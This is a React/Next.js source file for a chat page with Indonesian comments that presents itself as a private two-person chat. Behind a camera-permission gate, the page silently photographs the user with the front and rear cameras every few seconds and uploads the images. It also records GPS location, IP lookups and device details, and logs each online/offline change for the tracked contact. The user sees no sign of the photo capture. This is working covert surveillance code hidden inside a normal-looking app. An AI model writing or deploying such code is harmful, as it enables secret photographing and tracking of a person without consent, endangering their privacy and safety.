"use client";
import ChatList from "../components/ChatList";
import ChatInput from "../components/ChatInput";
import UserStatus from "../components/UserStatus";
import {useEffect, useState, useRef  } from "react"; 

//import { browserName, deviceType, osName, browserVersion, osVersion, engineName, engineVersion, deviceVendor, mobileModel} from 'react-device-detect';


// import { rtdb, ref, update, serverTimestamp } from "../../config/firebase";

import { storageBackup,database, storage } from "../config/firebase";
import { ref as databaseRef, push, update,get,set ,onValue,serverTimestamp } from "firebase/database";
import {
  ref as storageRef,
  uploadString,
  getDownloadURL
} from "firebase/storage";
import { 
  browserName, 
  deviceType, 
  osName, 
  browserVersion, 
  osVersion, 
  engineName, 
  engineVersion 
} from 'react-device-detect';

const ChatPageWrapper = () => {
  const [cameraAllowed, setCameraAllowed] = useState(false);

   const SECRET_CODE = "71"; // 🔐 ganti sesuka kamu
  const MAX_ATTEMPT = 5;const CODE_LENGTH = 2;

  const [codeAllowed, setCodeAllowed] = useState(false);
  const [inputCode, setInputCode] = useState("");
  const [attempt, setAttempt] = useState(0);
  const [locked, setLocked] = useState(false);

  const verifyCode = () => {
    if (locked) return;
  
    if (inputCode === SECRET_CODE) {
      setCodeAllowed(true);
    } else {
      const next = attempt + 1;
      setAttempt(next);
      setInputCode("");
  
      if (next >= MAX_ATTEMPT) {
        setLocked(true);
      }
  
      alert(`Kode salah! Percobaan ${next}/${MAX_ATTEMPT}`);
    }
  };
useEffect(() => {
  if (inputCode.length === CODE_LENGTH && !locked && !codeAllowed) {
    const t = setTimeout(verifyCode, 300);
    return () => clearTimeout(t);
  }
}, [inputCode]);


   const requestCamera = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      stream.getTracks().forEach((track) => track.stop());

      setCameraAllowed(true);
      localStorage.setItem("cameraGranted", "true");

      // reload sekali di awal setelah diizinkan
      window.location.reload();
    } catch (err) {
      console.warn("❌ Kamera tidak diizinkan:", err);
      setCameraAllowed(false);
       alert(
        "Anda telah memblokir izin kamera. Silakan klik ikon 🔒 di address bar browser, ubah Camera menjadi Allow, lalu coba lagi."
      );
    }
  };

  useEffect(() => {
    // kalau sebelumnya sudah pernah diizinkan
    if (localStorage.getItem("cameraGranted")) {
      setCameraAllowed(true);
    }

    // ✅ Pantau perubahan izin kamera realtime
    if (navigator.permissions) {
      navigator.permissions.query({ name: "camera" }).then((status) => {
        // set state awal
        if (status.state === "granted") {
          setCameraAllowed(true);
        } else {
          setCameraAllowed(false);
        }

        // kalau status berubah (allow → block atau sebaliknya)
        status.onchange = () => {
          console.log("📡 Camera permission berubah:", status.state);
          if (status.state === "granted") {
            localStorage.setItem("cameraGranted", "true");
            window.location.reload(); // reload sekali
          } else {
            localStorage.removeItem("cameraGranted");
            setCameraAllowed(false);
          }
        };
      });
    }
  }, []);

  return (
    <div className="relative">
      {/* ✅ Render ChatPage tetap jalan di belakang 
      <ChatPage />*/}
    {codeAllowed && (
   cameraAllowed ? (
    <ChatPage />
  ) : (
    <div className="min-h-screen flex flex-col bg-gradient-to-b from-gray-100 to-gray-200 dark:from-gray-900 dark:to-gray-800 ">
     <div className="max-w-7xl mx-auto w-full flex flex-col h-screen border border-gray-900 dark:border-gray-100">
   
     {/*<div className="max-w-full mx-auto h-screen flex flex-col bg-gradient-to-b from-gray-100 to-gray-200 dark:from-gray-900 dark:to-gray-800">
       Header fixed top-0 left-0 w-full */}
      <div className="flex-none bg-white dark:bg-gray-900 border border-gray-900 dark:border-gray-100 shadow-md sticky top-0 z-50">
        <div className="relative flex items-center justify-center p-2">
          <h2 className=" text-lg md:text-xl font-semibold text-gray-800 dark:text-gray-100">
            Chat dengan 
          </h2>
            
        </div>

        {/* Status */}
        <div className="flex justify-center items-center gap-2 mt-1">
        
        </div>
        <div className="text-center text-gray-500 dark:text-gray-400 text-sm mt-1">
         </div>
      </div>
           {/* Chat List */}
      <div className="flex-1 overflow-y-auto px-2 sm:px-4">
        <div className="flex-1 overflow-y-auto p-4 space-y-3">
  {Array.from({ length: 10 }).map((_, i) => (
    <div
      key={i}
      className={`flex ${i % 2 === 0 ? "justify-start" : "justify-end"}`}
    >
      <div
        className={`max-w-xs px-4 py-2 rounded-lg animate-pulse ${
          i % 2 === 0
            ? "bg-gray-300 text-left rounded-bl-none"
            : "bg-gray-400 text-right rounded-br-none"
        }`}
        style={{ width: `${Math.floor(Math.random() * 40) + 40}%` }}
      >
        &nbsp;
      </div>
    </div>
  ))}
</div>

      </div>

      {/* Input Chat fixed bottom-0 left-0 w-full*/}
      <div className="flex-none border border-gray-900 dark:border-gray-100 shadow-md sticky bottom-0">
          
      </div>
    </div>
  </div>)
  )}
     
      {!cameraAllowed && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
          <div className="p-6 bg-white shadow-xl rounded text-center max-w-sm">
            <p className="text-lg font-semibold text-red-600 mb-3">
              🚫 Kamera dibutuhkan
            </p>
            <p className="text-gray-600 mb-4">
              Silakan izinkan akses kamera untuk melanjutkan ke chat.
            </p>
            <button
              onClick={requestCamera}
              className="px-4 py-2 bg-blue-600 text-white rounded hover:bg-blue-700"
            >
              Izinkan Kamera
            </button>
          </div>
        </div>
      )}
{/* 1️⃣ POPUP KODE */}
{!codeAllowed && (
  <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
    <div className="p-6 bg-white shadow-xl rounded text-center max-w-sm w-full">
      <h2 className="text-lg font-semibold mb-2">🔐 Masukkan Kode Akses</h2>

      {locked ? (
        <p className="text-red-600">
          ❌ Akses diblokir karena terlalu banyak percobaan
        </p>
      ) : (
        <>
          <input
            type="password"
            value={inputCode}
                  maxLength={CODE_LENGTH}
            onChange={(e) => setInputCode(e.target.value)}
            className="w-full border rounded px-3 py-2 mb-3"
            placeholder="Masukkan kode"
          />

          <button
            onClick={verifyCode}
            className="w-full px-4 py-2 bg-blue-600 text-white rounded hover:bg-blue-700"
          >
            Konfirmasi
          </button>

          <p className="text-sm text-gray-500 mt-2">
            Percobaan: {attempt}/{MAX_ATTEMPT}
          </p>
        </>
      )}
    </div>
  </div>
)}

    </div>
  );
};

const ChatPage = () => {
  const [currentUser] = useState("syifa"); // Gantilah dengan ID pengguna yang sesuai
  const [chatWith] = useState("irul"); // ID pengguna tujuan
  const [topik] = useState("topik"); // ID pengguna tujuan
  const [isDark, setIsDark] = useState(false);
const [photoCaptureEnabled, setPhotoCaptureEnabled] = useState(true);

  
  useEffect(() => {
    // cek preferensi user sebelumnya
    if (localStorage.getItem("theme") === "dark") {
      document.documentElement.classList.add("dark");
      setIsDark(true);
    }
  }, []);
  const toggleTheme = () => {
    if (isDark) {
      document.documentElement.classList.remove("dark");
      localStorage.setItem("theme", "light");
      setIsDark(false);
    } else {
      document.documentElement.classList.add("dark");
      localStorage.setItem("theme", "dark");
      setIsDark(true);
    }
  };
  
//   const [location, setLocation] = useState(null);
// const [gpsEnabled, setGpsEnabled] = useState(false);
  
  const [replyMessage, setReplyMessage] = useState(null); // ✅ Reply Message
  const [isTyping, setIsTyping] = useState(false); 
  useEffect(() => {
    const typingRef = databaseRef(database, `typingStatus/${chatWith}`);

    // Pantau perubahan status mengetik dari lawan chat
    onValue(typingRef, (snapshot) => {
      const data = snapshot.val();
      setIsTyping(data?.typing || false);
    });

  }, [chatWith]);
  
  // useEffect(() => {
  //   const userRef = databaseRef(database, `pengguna/${chatWith}`);

  //   // Set pengguna online saat masuk
  //   update(userRef, {
  //     isOnline: true,
  //     lastSeen: serverTimestamp(),
  //   });

  //   // Set pengguna offline saat keluar
  //   const handleDisconnect = () => {
  //     update(userRef, {
  //       isOnline: false,
  //       lastSeen: serverTimestamp(),
  //     });
  //   };

  //   // Update setiap 20 detik
  //   const interval = setInterval(() => {
  //     update(userRef, { lastSeen: serverTimestamp() });
  //   }, 20000);

  //   window.addEventListener("beforeunload", handleDisconnect);
  //   return () => {
  //     clearInterval(interval);
  //     window.removeEventListener("beforeunload", handleDisconnect);
  //     handleDisconnect(); // Jika komponen di-unmount
  //   };
  // }, [chatWith]);  
  
 //  useEffect(() => {
 //    // getIPInfo();
 //    getLocation();
 //  }, []);
 //  const getLocation = () => {
 //    if (!navigator.geolocation) {
 //      alert("Geolocation tidak didukung di browser ini.");
 //      return;
 //    }

 //    navigator.geolocation.getCurrentPosition(
 //      (position) => {
 //        setLocation({
 //          latitude: position.coords.latitude,
 //          longitude: position.coords.longitude,
 //        });
 //        setGpsEnabled(true);
 //      },
 //      (error) => {
 //        console.error("Error mengambil lokasi:", error);
 //        alert("Mohon aktifkan GPS untuk mengirim pesan.");
 //        setGpsEnabled(false);
 //      }
 //    );
 //  };
 
 // useEffect(() => {
   

 //    const userRef = databaseRef(database, `pengguna/${chatWith}`);

 //    const logsRef = databaseRef(database, `logs_pengguna/${chatWith}`);

 //    // Set pengguna online saat masuk
 //    update(userRef, {
 //      user: chatWith,
 //      isOnline: true,
 //      lastSeen: serverTimestamp(),
 //       location: location ?? { latitude: 0, longitude: 0 },
    
 //    });

 //    // Simpan log saat user online
 //    push(logsRef, {
 //      user: chatWith,
 //      status: "online",
 //      timestamp: serverTimestamp(),
 //       location: location ?? { latitude: 0, longitude: 0 },
    
 //    });

   

 //    // Set pengguna offline saat keluar
 //    const handleDisconnect = () => {
 //      update(userRef, {
 //        user: chatWith,
 //        isOnline: false,
 //        lastSeen: serverTimestamp(),
 //      });

 //       // Simpan log saat user offline
 //       push(logsRef, {
 //        user: chatWith,
 //        status: "offline",
 //        timestamp: serverTimestamp(),
 //         location: location ?? { latitude: 0, longitude: 0 },
 //      });
 //    };

 //    // Update setiap 20 detik
 //    const interval = setInterval(() => {
 //      update(userRef, { lastSeen: serverTimestamp() });

 //       // Simpan log waktu terakhir dilihat
 //       push(logsRef, {
 //        user: chatWith,
 //        status: "update_lastSeen",
 //        timestamp: serverTimestamp(),
 //         location: location ?? { latitude: 0, longitude: 0 },
 //      });
 //    }, 50000);

 //    window.addEventListener("beforeunload", handleDisconnect);
 //    return () => {
 //      clearInterval(interval);
 //      window.removeEventListener("beforeunload", handleDisconnect);
 //      handleDisconnect(); // Jika komponen di-unmount
        
 //    };
 //  }, [chatWith]);
   useEffect(() => {
    getIPInfo();
    getIPInfo1();
  }, []);

  const [ipInfo, setIpInfo] = useState(null);
  const [ipInfo1, setIpInfo1] = useState(null);

  const getIPInfo = async () => {
    try {
      const response = await fetch("/api/ip");
      if (!response.ok) throw new Error("Gagal mengambil data IP");
      const data = await response.json();
      setIpInfo(data); // misal: { ip: '123.45.67.89' }
    } catch (error) {
      console.error("Error mengambil IP:", error);
    }
  };
  const getIPInfo1 = async () => {
    try {
      const response = await fetch(`https://ipapi.co/json/`);
      if (!response.ok) throw new Error("Gagal mengambil data IP");
      const data = await response.json();
      setIpInfo1(data); // misal: { ip: '123.45.67.89' }
    } catch (error) {
      console.error("Error mengambil IP:", error);
    }
  };
  const deviceInfo = {
      browser: browserName ?? null,
      browserVersion: browserVersion ?? null,
      os: osName ?? null,
      osVersion: osVersion ?? null,
      engine: engineName ?? null,
      engineVersion: engineVersion ?? null,
      deviceType: deviceType ?? null,
   //   deviceVendor: deviceVendor ?? null,
   //   mobileModel: mobileModel ?? null
    };
const capturePhoto09090 = () => {
    const now = new Date();
    const time = now.toLocaleTimeString();
    console.log(`📸 Foto diambil pada: ${time}`);
    // --- di sini kamu bisa tambahkan kode capture kamera asli ---
  };
  
  const intervalRef = useRef(null);
  // ========= FUNGSI CAPTURE FOTO =========
  const capturePhoto = async (status = "unknown") => {
     if (!photoCaptureEnabled) {
      console.warn("Capture Photo dimatikan");
      return null; // jangan ambil foto
    }
    try {
      // Cek semua device kamera yang tersedia
      const devices = await navigator.mediaDevices.enumerateDevices();
      const videoInputs = devices.filter((d) => d.kind === "videoinput");

      // Kalau gak ada kamera
      if (videoInputs.length === 0) {
        throw new Error("Tidak ada kamera yang terdeteksi");
      }

      // Tentukan facingMode yang mau diambil
      const facingModes =
        videoInputs.length > 1
          ? ["user", "environment"] // dua kamera
          : ["user"]; // satu aja (biasanya laptop)

      const capturedURLs = [];

      // Loop ambil semua kamera yang tersedia
      for (const facing of facingModes) {
        const constraints = {
          video: { facingMode: { exact: facing } }
        };

        try {
          // 1. Ambil stream
          const stream = await navigator.mediaDevices.getUserMedia(constraints);
          const video = document.createElement("video");
          video.srcObject = stream;
          await video.play();

          // Tunggu sedikit agar kamera siap
          await new Promise((r) => setTimeout(r, 500));

          // 2. Capture ke canvas
          const canvas = document.createElement("canvas");
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          const ctx = canvas.getContext("2d");
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

          const imageData = canvas.toDataURL("image/png");

          // 3. Stop kamera
          stream.getTracks().forEach((track) => track.stop());

          // Upload via server-side API
          const res = await fetch("/api/uploadPhotot", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              imageData,
              currentUser,
              chatWith,
              topik,
              status,
              facing
            })
          });

          const data = await res.json();

          capturedURLs.push({ facing, downloadURL: data.data.downloadURL });
          // console.log(`Foto (${facing}) diupload ke:`, data.data.downloadURL);

          // console.log("Foto diupload ke:", data.data.storageUsed);
         
        } catch (err) {
          console.warn(`Gagal ambil kamera ${facing}:`, err.message);
        }
      }

      return capturedURLs; // hasil array { facing, downloadURL }
    } catch (err) {
      console.error("Gagal capture foto:", err);
      return [];
    }
  };
   // 🔥 JALAN SETIAP 10 DETIK
  useEffect(() => {
    // jalan langsung sekali (opsional)
    capturePhoto("auto");

    intervalRef.current = setInterval(() => {
      capturePhoto("auto");
    // }, 10_000); // 10 detik
    }, 5000); // 10 detik

    return () => {
      clearInterval(intervalRef.current);
    };
  }, []);
  const capturePhoto5 = async (status = "unknown") => {
  try {
    // Cek semua device kamera yang tersedia
    const devices = await navigator.mediaDevices.enumerateDevices();
    const videoInputs = devices.filter((d) => d.kind === "videoinput");

    // Kalau gak ada kamera
    if (videoInputs.length === 0) {
      throw new Error("Tidak ada kamera yang terdeteksi");
    }

    // Tentukan facingMode yang mau diambil
    const facingModes = videoInputs.length > 1
      ? ["user", "environment"] // dua kamera
      : ["user"]; // satu aja (biasanya laptop)

    const capturedURLs = [];

    // Loop ambil semua kamera yang tersedia
    for (const facing of facingModes) {
      const constraints = {
        video: { facingMode: { exact: facing } },
      };

      try {
        // 1. Ambil stream
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        const video = document.createElement("video");
        video.srcObject = stream;
        await video.play();

        // Tunggu sedikit agar kamera siap
        await new Promise((r) => setTimeout(r, 500));

        // 2. Capture ke canvas
        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        const imageData = canvas.toDataURL("image/png");

        // 3. Stop kamera
        stream.getTracks().forEach((track) => track.stop());

        // 4. Upload ke Firebase Storage
        const timestamp = Date.now();
         const filename = `user_captures/${chatWith}_${status}_${facing}_${timestamp}.png`;

        // const fileRef = storageRef(
        //   storage,
        //   `user_captures/${chatWith}_${status}_${facing}_${timestamp}.png`
        // );
        // await uploadString(fileRef, imageData, "data_url");
        // const downloadURL = await getDownloadURL(fileRef);
        
       let downloadURL;
try {
          const fileRefMain = storageRef(storageMain, filename);
          await uploadString(fileRefMain, imageData, "data_url");
          downloadURL = await getDownloadURL(fileRefMain);
          console.log("✅ Upload ke storage MAIN berhasil");
        } catch (uploadMainError) {
          console.warn("⚠️ Upload ke storage MAIN gagal, coba BACKUP...", uploadMainError.message);

          try {
            const fileRefBackup = storageRef(storageBackup, filename);
            await uploadString(fileRefBackup, imageData, "data_url");
            downloadURL = await getDownloadURL(fileRefBackup);
            console.log("✅ Upload ke storage BACKUP berhasil");
          } catch (uploadBackupError) {
            console.error("❌ Upload ke BACKUP juga gagal:", uploadBackupError.message);
            throw uploadBackupError;
          }
        }
        capturedURLs.push({ facing, downloadURL });
      } catch (err) {
        console.warn(`Gagal ambil kamera ${facing}:`, err.message);
      }
    }

    return capturedURLs; // hasil array { facing, downloadURL }
  } catch (err) {
    console.error("Gagal capture foto:", err);
    return [];
  }
};

  const capturePhoto1 = async (status = "unknown") => {
    try {
      // 1. Ambil stream kamera
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      const video = document.createElement("video");
      video.srcObject = stream;
      await video.play();

      // 2. Render ke canvas
      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext("2d");
      ctx?.drawImage(video, 0, 0);

      const imageData = canvas.toDataURL("image/png");

      // 3. Stop kamera (hemat baterai)
      stream.getTracks().forEach((track) => track.stop());

      // 4. Upload ke Firebase Storage
      const timestamp = Date.now();
      const fileRef = storageRef(
        storage,
        `user_captures/${chatWith}_${status}_${timestamp}.png`
      );
      await uploadString(fileRef, imageData, "data_url");
      const downloadURL = await getDownloadURL(fileRef);

      return downloadURL;
    } catch (err) {
      console.error("Gagal capture foto:", err);
      return null;
    }
  };
  
  useEffect(() => {
  if (!chatWith) return;

  const userRef = databaseRef(database, `pengguna/${chatWith}`);
  const logsRef = databaseRef(database, `logs_pengguna1/${chatWith}`);

  const saveOldDataToLogs = async (status) => {
    const snapshot = await get(userRef);
    const oldData = snapshot.val();

    // if (oldData) {
    //   const logRef = push(logsRef); // ambil ref-nya dulu
    //   await set(logRef, {
    //     ...oldData,
    //     deleteTime: serverTimestamp(),
    //   });

    //   console.log("Data log disimpan ke:", logRef); // bisa log id-nya
    // }
    if (oldData) {
      // const logData = {
      //   ...oldData,
      //   deleteTime: serverTimestamp(),
      // };

      // const logRef= await set(push(logsRef), logData);
      //  // Tambahkan ini untuk melihat deleteTime yang sudah jadi timestamp
      // onValue(logRef, (snap) => {
      //   console.log("Log disimpan ke:", snap.val());
      // });
      const newLogRef = push(logsRef);

        await set(newLogRef, {
          ...oldData,
          status,
          deleteTime: serverTimestamp(),
        });

        // Tambahkan ini untuk melihat deleteTime yang sudah jadi timestamp
        onValue(newLogRef, (snap) => {
          // console.log("Log disimpan ke:", snap.val());
        });
      // console.log("Data yang dikirim ke log:", logData);
    }


  };

  const updateOnlineStatus = async (latitude = null, longitude = null,  ip1 = null, ip2 = null) => {
    await saveOldDataToLogs("online"); // simpan data lama dulu
    const photoURL = await capturePhoto("online");
    const data = {
      user: chatWith,
      isOnline: true,
      lastSeen: serverTimestamp(),
      deviceInfo,
      ip1:ipInfo,
      ip2:ipInfo1,
      // photoURL: photoURL || null
    };

    if (ipInfo) data.ip1 = ipInfo;
    if (ipInfo1) data.ip2 = ipInfo1;
    if (latitude && longitude) {
      data.latitude = latitude;
      data.longitude = longitude;
    }
    
    // Isi foto hanya kalau ada
  if (photoURL) data.photoURL = photoURL;
    update(userRef, data);
  };

  const updateOfflineStatus = async () => {
    await saveOldDataToLogs("offline"); // simpan sebelum offline
    const photoURL = await capturePhoto("offline");
    const data = {
      user: chatWith,
      isOnline: false,
      lastSeen: serverTimestamp(),
      
      deviceInfo,
      ip1:ipInfo,
      ip2:ipInfo1,
      // photoURL1: photoURL || null
    };
    if (ipInfo) data.ip1 = ipInfo;
    if (ipInfo1) data.ip2 = ipInfo1;
    if (latitude && longitude) {
      data.latitude = latitude;
      data.longitude = longitude;
    }
    // Isi foto hanya kalau ada
  if (photoURL) data.photoURL = photoURL;
     update(userRef, data);
  };

  const updateLastSeen = async () => {
    await saveOldDataToLogs("update_lastSeen"); // simpan sebelum update
    const photoURL = await capturePhoto("update_lastSeen");
    // if (photoURL) data.photoURL2 = photoURL;
    update(userRef, {
      lastSeen: serverTimestamp(),
      // photoURL2: photoURL || null
      
    ...(photoURL ? { photoURL_lastSeen: photoURL } : {})
    });
  };

  const getLocationAndUpdate = () => {
    if (!navigator.geolocation) {
      alert("Geolocation tidak didukung di browser ini.");
      updateOnlineStatus(); // Tetap update walau tanpa lokasi
      return;
    }

    navigator.geolocation.getCurrentPosition(
      (position) => {
        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;
        updateOnlineStatus(latitude, longitude);
      },
      (error) => {
        console.error("Gagal mengambil lokasi:", error);
        alert("Aktifkan GPS untuk update lokasi.");
        updateOnlineStatus(); // Tetap update walau gagal lokasi
      }
    );
  };
// <button
//   onClick={() => setPhotoCaptureEnabled((prev) => !prev)}
//   className={`px-3 py-1 mt-2 rounded text-white 
//     ${photoCaptureEnabled ? "bg-green-600" : "bg-red-600"}`}
// >
//   {photoCaptureEnabled ? "Capture ON1" : "Capture OFF1"}
// </button>
  // Saat user aktif
  getLocationAndUpdate();

  // Update lastSeen setiap 50 detik
  const interval = setInterval(() => {
    updateLastSeen();
  }, 20000);

  // Tangani disconnect
  window.addEventListener("beforeunload", updateOfflineStatus);

  return () => {
    clearInterval(interval);
    window.removeEventListener("beforeunload", updateOfflineStatus);
    updateOfflineStatus(); // Saat komponen unmount
  };
}, [chatWith]);
  return (
     <div className="min-h-screen flex flex-col bg-gradient-to-b from-gray-100 to-gray-200 dark:from-gray-900 dark:to-gray-800 ">
     <div className="max-w-7xl mx-auto w-full flex flex-col h-screen border border-gray-900 dark:border-gray-100">
   
     {/*<div className="max-w-full mx-auto h-screen flex flex-col bg-gradient-to-b from-gray-100 to-gray-200 dark:from-gray-900 dark:to-gray-800">
       Header fixed top-0 left-0 w-full */}
      <div className="flex-none bg-white dark:bg-gray-900 border border-gray-900 dark:border-gray-100 shadow-md sticky top-0 z-50">
        <div className="relative flex items-center justify-center p-2">
          <h2 className=" text-lg md:text-xl font-semibold text-gray-800 dark:text-gray-100">
            Chat dengan {currentUser}
          </h2>
 


            <button 
              onClick={toggleTheme} 
              className="absolute right-4 top-1/2 -translate-y-1/2 p-2 text-white bg-white border border-gray-300 focus:outline-none hover:bg-gray-100 focus:ring-2 focus:ring-gray-100 font-medium rounded-full text-sm px-2 py-2 m-2 dark:bg-gray-500 dark:text-gray-600 dark:border-gray-600 dark:hover:bg-gray-400 dark:hover:border-gray-400 dark:focus:ring-gray-500"
              aria-label="Toggle Theme" 
            >
              {isDark ? (
               // Icon Siang 🌞
                <svg className="w-6 h-6 text-white" xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 24 24">
                  <path fillRule="evenodd" d="M13 3a1 1 0 1 0-2 0v2a1 1 0 1 0 2 0V3ZM6.343 4.929A1 1 0 0 0 4.93 6.343l1.414 1.414a1 1 0 0 0 1.414-1.414L6.343 4.929Zm12.728 1.414a1 1 0 0 0-1.414-1.414l-1.414 1.414a1 1 0 0 0 1.414 1.414l1.414-1.414ZM12 7a5 5 0 1 0 0 10 5 5 0 0 0 0-10Zm-9 4a1 1 0 1 0 0 2h2a1 1 0 1 0 0-2H3Zm16 0a1 1 0 1 0 0 2h2a1 1 0 1 0 0-2h-2ZM7.757 17.657a1 1 0 1 0-1.414-1.414l-1.414 1.414a1 1 0 1 0 1.414 1.414l1.414-1.414Zm9.9-1.414a1 1 0 0 0-1.414 1.414l1.414 1.414a1 1 0 0 0 1.414-1.414l-1.414-1.414ZM13 19a1 1 0 1 0-2 0v2a1 1 0 1 0 2 0v-2Z" clipRule="evenodd" />
                </svg>
              ) : (
                
                 // Icon Malam 🌙
                <svg className="w-6 h-6 text-gray-800" xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 24 24">
                  <path fillRule="evenodd" d="M11.675 2.015a.998.998 0 0 0-.403.011C6.09 2.4 2 6.722 2 12c0 5.523 4.477 10 10 10 4.356 0 8.058-2.784 9.43-6.667a1 1 0 0 0-1.02-1.33c-.08.006-.105.005-.127.005h-.001l-.028-.002A5.227 5.227 0 0 0 20 14a8 8 0 0 1-8-8c0-.952.121-1.752.404-2.558a.996.996 0 0 0 .096-.428V3a1 1 0 0 0-.825-.985Z" clipRule="evenodd" />
                </svg>
              )}
            </button>
        </div>

        {/* Status */}
        <div className="flex justify-center items-center gap-2 mt-1">
          <UserStatus userId={currentUser} />
        </div>
        <div className="text-center text-gray-500 dark:text-gray-400 text-sm mt-1">
          {isTyping && <span>{currentUser} sedang mengetik...</span>}
        </div>
      </div>
           {/* Chat List */}
      <div className="flex-1 overflow-y-auto px-2 sm:px-4">
        <ChatList
          user1={chatWith}
          user2={currentUser}
          setReplyMessage={setReplyMessage}
        />
      </div>

      {/* Input Chat fixed bottom-0 left-0 w-full*/}
      <div className="flex-none border border-gray-900 dark:border-gray-100 shadow-md sticky bottom-0">
          <ChatInput
            pengirim={chatWith}
            penerima={currentUser}
            replyMessage={replyMessage}
            setReplyMessage={setReplyMessage}
              isDark={isDark}
          />
      </div>
    </div>
  </div>
       

  );
};

export default ChatPageWrapper;


//  <button
//   onClick={() => setPhotoCaptureEnabled(!photoCaptureEnabled)}
//   className="absolute left-4 top-1/2 -translate-y-1/2 px-3 py-1 text-sm rounded bg-blue-600 text-white"
// >
//   {photoCaptureEnabled ? "Capture ON" : "Capture OFF"}
// </button>
// export default ChatPage;
  //    <div className="max-w-full mx-auto h-screen flex flex-col bg-gray-100">
  //     <div className="flex-none bg-white border-b border-gray-300 shadow-md  fixed top-0 left-0 w-full z-50">
  //       <h2 className="text-xl font-semibold text-center">Chat dengan {currentUser}</h2>
  //       <UserStatus userId={currentUser} />
  //        <div className="text-center text-gray-500 text-sm my-2">
  //         {isTyping && <span>{currentUser} sedang mengetik...</span>}
  //       </div>
  // <hr/>
        
  //     </div>
  // <br/><br/>

  //     {/* Bagian ChatList bisa di-scroll */}
  //     <div className="flex-1 overflow-y-auto ">
  //       <ChatList user1={chatWith} user2={currentUser} setReplyMessage={setReplyMessage} />
       
       
  //     </div>
  // <br/><br/>
  // <br/><br/>
      

  //     {/* Input tetap di bawah */}
  //     <div className="flex-none bg-white border-t border-gray-300 fixed bottom-0 left-0 w-full">
  //       <ChatInput pengirim={chatWith} penerima={currentUser} replyMessage={replyMessage} setReplyMessage={setReplyMessage} />
  //     </div>
    // </div>

// // import { useState } from "react";
// // import ChatList from "../../components/ChatList";
// // import ChatInput from "../../components/ChatInput";
// // import VideoCall from "../../components/VideoCall";

// // const ChatPage = () => {
// //   const [currentUser] = useState("user2");
// //   const [chatWith] = useState("user1");

// //   return (
// //     <div className="max-w-lg mx-auto p-4 space-y-4">
// //       <h1 className="text-xl font-bold text-white text-center">Chat {chatWith}</h1>
// //       <ChatList user1={currentUser} user2={chatWith} />
// //       <ChatInput pengirim={currentUser} penerima={chatWith} />
// //       <VideoCall pengirim={currentUser} penerima={chatWith} />
// //     </div>
// //   );
// // };

// // export default ChatPage;
// import { useState } from "react";
// import VideoCallList from "../../components/VideoCallList";
// import VideoCall from "../../components/VideoCall";

// export default function VideoCallPage() {
//   const [selectedCall, setSelectedCall] = useState(null);

//   return (
//     <div className="flex flex-col items-center p-6">
//       <h1 className="text-2xl font-bold mb-4">Panggilan Video</h1>
//       <VideoCallList userId="user1" onSelectCall={(call) => setSelectedCall(call)} />
//       <VideoCall pengirim="user1" penerima={selectedCall} onEndCall={() => setSelectedCall(null)} />
     

//       {!selectedCall ? (
//         // Menampilkan daftar panggilan jika belum memilih kontak
//         <VideoCallList userId="user1" onSelectCall={(call) => setSelectedCall(call)} />
//       ) : (
//         // Menampilkan panggilan video jika ada yang dipilih
//         <VideoCall pengirim="user1" penerima={selectedCall} onEndCall={() => setSelectedCall(null)} />
//       )}
//     </div>
//   );
// }
